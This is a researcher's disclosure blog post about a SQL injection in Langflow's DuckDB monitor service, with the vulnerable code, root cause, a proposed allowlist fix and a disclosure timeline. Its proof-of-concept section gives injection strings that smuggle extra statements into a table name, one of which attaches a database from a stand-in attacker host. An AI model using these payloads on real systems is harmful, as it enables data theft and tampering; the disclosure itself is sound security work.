---
layout: post
title: "Langflow SQL Injection in the Monitor Service: Four f-strings, One DuckDB Connection"
date: 2026-06-14
author: Yunus Aydın
lang: en
description: "Langflow's monitor service built DuckDB queries with f-strings on user-controllable table names. I reported it via GitHub issue #1629; maintainer acknowledged it but kept the experimental code shipping."
keywords: "Langflow, SQL injection, DuckDB, f-string, monitor service, security vulnerability, security research, bug bounty"
canonical_url: "https://aydinnyunus.github.io/2026/06/14/langflow-sql-injection-monitor-service/"
---

I reported a SQL injection in Langflow's monitor service on April 5, 2024 as [GitHub issue #1629](https://github.com/langflow-ai/langflow/issues/1629). Four places in one file (`src/backend/base/langflow/services/monitor/utils.py`) built DuckDB queries with Python f-strings around values that flowed in from the application layer. No escaping, no allowlist, no parameterization for identifiers.

I was browsing the Langflow codebase looking at how it persisted run metadata (the project was getting traction as an LLM-flow builder and I wanted to see how the monitoring layer was wired up). The first `grep -n "execute(f\"" src/` hit on `monitor/utils.py` and I saw four f-string SQL calls in a row. That's the kind of file you read once and know exactly what's wrong.

## The vulnerable code

Here are the four call sites as they existed in v1.0 alpha:

```python
# Line 17: schema introspection
def get_table_schema_as_dict(conn, table_name: str) -> dict:
    result = conn.execute(f"PRAGMA table_info('{table_name}')").fetchall()

# Line 63: DROP
conn.execute(f"DROP TABLE IF EXISTS {table_name}")

# Line 67: sequence creation
conn.execute(f"CREATE SEQUENCE seq_{table_name} START 1;")

# Line 97: INSERT
insert_sql = f"INSERT INTO {table_name} ({columns}) VALUES ({values_placeholders})"
conn.execute(insert_sql, values)
```

The values inside the placeholders (`?`) on line 97 are parameterized correctly. The structure of the statement is not. `table_name` and `columns` come straight from a Python dict and get interpolated as raw text.

## Root cause

There are no checks on `table_name`. None.

1. No allowlist of permitted table identifiers.
2. No DuckDB identifier quoting (no `quote_identifier`, no double-quote wrapping).
3. No type discipline: the function signature says `str`, but nothing enforces what the string contains.
4. The same unguarded `table_name` is reused across `PRAGMA`, `DROP`, `CREATE SEQUENCE`, and `INSERT`, so any one tainted path poisons the whole table lifecycle.

If you can influence `table_name` (and the Monitor Service receives flow execution data that is shaped by user-defined flows), you can break out of the identifier slot and run arbitrary DuckDB SQL.

## Proof of concept

Conceptually the trigger looks like this. A malicious `table_name` for the `DROP TABLE IF EXISTS` path:

```text
messages; ATTACH 'http://attacker/x.duckdb' AS evil; --
```

After interpolation:

```sql
DROP TABLE IF EXISTS messages; ATTACH 'http://attacker/x.duckdb' AS evil; --
```

DuckDB will happily execute multi-statement input over a single connection. With ATTACH plus DuckDB extensions like `httpfs`, you can pull or push files; with `COPY` you can read from or write to disk paths the process can reach. The PRAGMA path is similarly broken:

```text
'); SELECT * FROM duckdb_settings(); --
```

becomes:

```sql
PRAGMA table_info(''); SELECT * FROM duckdb_settings(); --
```

The exact reach depends on which DuckDB extensions are loaded in the host environment, but the moment you have arbitrary statement injection into a DuckDB connection, you are no longer talking about "just SQLi".

## Impact

- Arbitrary statement execution against the monitor DuckDB store.
- Leakage of monitoring data (LLM prompts, run inputs, run outputs).
- File read/write through DuckDB extensions when loaded, in the working directory of the Langflow process.
- Schema corruption: `DROP TABLE` and `CREATE SEQUENCE` are both reachable identifier slots, so an attacker can knock the monitor offline or seed bad state.

## The fix

The minimal correct fix is to never f-string an identifier into SQL. Either allowlist the table names (the Monitor Service only manages a handful of internal tables: `messages`, `transactions`, `vertex_builds`) or quote-escape them. The DuckDB-safe shape:

```python
ALLOWED_TABLES = {"messages", "transactions", "vertex_builds"}

def _quote_ident(name: str) -> str:
    if name not in ALLOWED_TABLES:
        raise ValueError(f"unexpected table: {name!r}")
    return '"' + name.replace('"', '""') + '"'

conn.execute(f"DROP TABLE IF EXISTS {_quote_ident(table_name)}")
```

The maintainer ([@ogabrielluiz](https://github.com/ogabrielluiz)) acknowledged the report and chose a different fix path: the Monitor Service is experimental and the eventual plan is to migrate it to SQLModel (which handles parameterization the right way out of the box). The issue was closed without a code change on April 10, 2024.

## Why this pattern keeps showing up

DuckDB and SQLite both let you stuff identifiers into queries with no fuss, and both libraries' Python bindings parameterize values but not identifiers. So the developer writes `conn.execute("SELECT ?", [name])` for the obvious case, and reaches for f-strings the moment they need a dynamic table name. The `?` is right there in the same call. The mental model is "parameters handle this for me", and it does, until you need to vary the schema.

The Monitor Service is also a textbook example of "experimental code keeps shipping". Calling a module experimental is fine in the README; it is not a security boundary. If the code is bundled in the install, exposed to flow data, and writing to a file on disk, it has the same attack surface as the rest of the application. The acknowledgement-and-defer response is honest, and I appreciate that the maintainer said so directly. But the practical effect is that users running Langflow in production between this report and the eventual SQLModel migration carried the bug.

## Disclosure timeline

- **April 5, 2024**: I opened [GitHub issue #1629](https://github.com/langflow-ai/langflow/issues/1629) with file references and remediation guidance.
- **April 9, 2024**: Maintainer [@ogabrielluiz](https://github.com/ogabrielluiz) replied, acknowledged the issue, noted the Monitor Service is experimental, and signalled an eventual migration to SQLModel.
- **April 10, 2024**: Issue closed.
- **No CVE was assigned.**

## References

- [GitHub Issue: Langflow #1629](https://github.com/langflow-ai/langflow/issues/1629)
- [Vulnerable file (current dev branch)](https://github.com/langflow-ai/langflow/blob/dev/src/backend/base/langflow/services/monitor/utils.py)
- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [DuckDB SQL Identifiers documentation](https://duckdb.org/docs/sql/dialect/keywords_and_identifiers)

## Related content

- [SQL Injection in GeoPandas to_postgis()](https://aydinnyunus.github.io/2025/12/27/sql-injection-geopandas/)
- [Command Injection in NLTK Collocations](https://aydinnyunus.github.io/2026/06/07/command-injection-nltk-collocations-eval/)
